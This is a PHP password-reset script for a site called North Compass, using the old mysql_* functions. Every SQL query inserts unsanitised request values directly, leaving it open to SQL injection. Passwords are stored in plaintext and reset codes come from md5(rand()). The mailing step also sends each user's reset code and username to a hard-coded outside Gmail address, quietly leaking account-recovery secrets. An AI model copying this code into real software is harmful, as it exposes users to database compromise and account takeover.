<?php
include('Conexion.php');
if (isset($_REQUEST['accion']))///////////////////restablecer contraseña
{
$reset = $_REQUEST['accion'];
if 	($reset==1)
	{
$NewPas1=$_REQUEST['ContraNew1'];
//$NewPas2=$_REQUEST['ContraNew2'];
$PasVer=$_REQUEST['PasVer'];
mysql_select_db('northcompas', $link);
$consulta=mysql_query("select * from  login where  	RandomPass = '".$PasVer."'")or die('{success:false}');
 $row1=mysql_fetch_array($consulta);
 $RandomPass=$row1['RandomPass'];
 $Csc_Login=$row1['Csc_Login'];
	if($RandomPass==$PasVer)
		{
		mysql_query("update login set PassWord= '".$NewPas1."', Estado='1' where RandomPass = '".$PasVer."'")or die ('{success:false}');
				mysql_select_db('northcompas', $link);
				mysql_query("update ingresos set Acepto='ModError' where Login_Csc='".$Csc_Login."' and Acepto ='Error'")or die('{success:false}');
		echo '{success:true}';
		}else{
echo	'{success:false}';
			}
	}
	
}


if (isset($_REQUEST['Password']))
{
$Pasword=$_REQUEST['Password'];
if($Pasword<>'')
{
$SQL="select * from  login where Mail='".$Pasword."'";
$db=mysql_select_db('northcompas', $link);
$query=mysql_query($SQL)or die('Error');
$row=mysql_fetch_array($query);
$userdb=$row['Usuario'];
$pasdb=$row['PassWord'];
$cabeceras = "Content-type: text/html\r\n";
if ($userdb==''){
 $remote_ip  = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : "(Sin IP)"; 
 $remote_isp = gethostbyaddr($remote_ip); 	
$message="Error \n<br />"."Lo Sentimos usted no se encuentra registrado en Nuestro sistema\n<br/>";
$message.="IP/ISP:     ".$remote_ip." Ip Remota(".$remote_isp.")"."</br>";
$message.='<fotn color="red">Aga caso omiso a esta informacion '."</br>".'No responda este mensaje</font>';
mail($Pasword,'NORTH COMPAS', $message, $cabeceras)or die('success:false'); 
echo '{success:false}';	
	}else{
$caracteres = 8;
$random_pass = substr(md5(rand()),0,$caracteres);
$message="<br /></br>Mensaje Generado Automaticamente favor no responda este mensaje <br />";
//$message.="Codigo generado automaticamente para Restablecer contraseña \n";
$message.="<strong>INFORMACION REGISTRO</strong><br />";
$message.="Usuario:".$userdb."<br />";
$message.="<strong>CODIGO VERIFICACION:".$random_pass."<br /><br /></strong>";
$message.="Dele click al Siguiente Vinculo para restablecer su contraseña<br /><br />";
$message.="http://www.northcompass.com.co/Reset_Pass/Index.php<br /><br /><br />";
$message.="Si el link no funciona copielo y peguelo en su navegador <br /> Gracias <br /> webmaster-NORTHCOMPASS";

mysql_select_db('northcompas', $link);
mysql_query("update login set RandomPass='".$random_pass."' where Mail='".$Pasword."'")or die('Eror Al insertar condigo en DB');
$components = new Components();

$mails =array($_REQUEST['Password'],'joshleclash@gmail.com');

$mail = $components->sendRsForMail($mails,'NORTH COMPAS', $message);
if($mail){
        echo '{success: true}';
        }
  }
}
else{
	echo '{success:false}';
}
}
?>



